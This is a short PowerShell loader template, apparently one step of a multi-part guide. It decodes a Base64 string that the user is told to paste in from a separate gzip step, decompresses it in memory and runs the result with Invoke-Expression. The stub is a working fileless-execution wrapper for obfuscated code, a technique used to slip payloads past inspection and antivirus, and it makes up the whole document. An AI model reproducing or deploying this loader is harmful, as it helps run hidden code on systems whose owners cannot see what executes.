$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('
#----->> paste here between the '' the gzip string from point 5-gzipcompress.md <<-----
'));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
